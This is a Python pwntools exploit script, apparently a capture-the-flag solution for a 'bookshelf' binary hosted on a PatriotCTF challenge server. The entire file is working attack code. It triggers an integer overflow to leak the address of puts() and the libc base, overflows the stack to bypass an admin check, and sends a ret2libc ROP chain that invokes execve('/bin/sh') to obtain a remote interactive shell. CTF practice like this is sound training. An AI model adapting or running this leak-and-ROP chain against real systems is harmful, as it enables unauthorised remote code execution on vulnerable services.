#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/patriot/bookshelf/bookshelf')
rop = ROP(elf)
libc = ELF('/home/kali/Desktop/patriot/bookshelf/libc.so.6')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
rop_libc = ROP(libc)
context.arch = elf.arch

# p = process('/home/kali/Desktop/patriot/bookshelf/bookshelf') #, env={"LD_PRELOAD":"/home/kali/Desktop/patriot/bookshelf/libc.so.6"})
# gdb.attach(p, gdbscript='b *adminBook+114')
p = remote('chal.pctf.competitivecyber.club', 4444)

# int overflow to get a lot of money and puts() address
for _ in range(9):
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(b'y')

p.recv()
p.sendline(b'2')
p.recv()
p.sendline(b'3')
resp = p.recvuntil(b'slumber').decode(errors='ignore')
print(resp)
puts_addr = int(resp[resp.find('glory') + 6: resp.find(' rested in')], 16)
libc_addr = puts_addr - libc.sym['puts']
print(f"LEAKED PUTS ADDR: {hex(puts_addr)}")
print(f"LEAKED LIBC ADDR: {hex(libc_addr)}")
p.sendline(b'N')

# Stack oveflow to bypass admin check
print(p.recv().decode(errors='ignore'))
p.sendline(b'1')
print(p.recv().decode(errors='ignore'))
p.sendline(b'y')
p.sendline(cyclic(38))

# buffer overflow to ret2libc
bin_sh = next(libc.search(b'/bin/sh')) + libc_addr
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_addr
pop_rdx = rop_libc.find_gadget(['pop rdx', 'pop rbx', 'ret']).address + libc_addr
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_addr
pop_rax = rop_libc.find_gadget(['pop rax', 'ret']).address + libc_addr
syscall = rop_libc.find_gadget(['syscall', 'ret']).address + libc_addr

payload = cyclic(56)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

print(p.recv().decode(errors='ignore'))
p.sendline(b'3')
print(p.recv().decode(errors='ignore'))
p.sendline(payload)

p.interactive()
